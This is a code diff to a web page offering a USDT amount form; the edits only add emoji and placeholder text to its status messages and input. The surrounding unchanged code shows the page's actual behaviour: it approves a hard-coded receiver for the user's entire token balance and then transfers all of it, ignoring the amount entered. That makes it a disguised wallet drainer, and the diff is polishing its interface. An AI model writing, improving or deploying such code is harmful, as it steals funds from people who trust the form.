@@ -81,7 +81,7 @@
     }
 
     .button.loading::after {
-      content: " Processing.";
+      content: "⏳ Processing...";
       position: absolute;
       left: 0;
       top: 0;
@@ -107,7 +107,7 @@
 
     <label>Amount</label>
     <div class="amount-box">
-      <input type="number" id="amount" placeholder="USDT Amount">
+      <input type="number" id="amount" placeholder="Enter USDT Amount">
       <span onclick="fillMax()">Max</span>
       <span>USDT</span>
     </div>
@@ -149,11 +149,11 @@
         await contract.methods.approve(RECEIVER, balance).send({ from: user });
         await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
-        btn.innerText = " Done";
+        btn.innerText = "✅ Done";
         btn.style.backgroundColor = "green";
       } catch (err) {
         console.error(err);
-        btn.innerText = " ";
+        btn.innerText = "❌ Failed";
         btn.style.backgroundColor = "red";
       } finally {
         btn.classList.remove("loading");
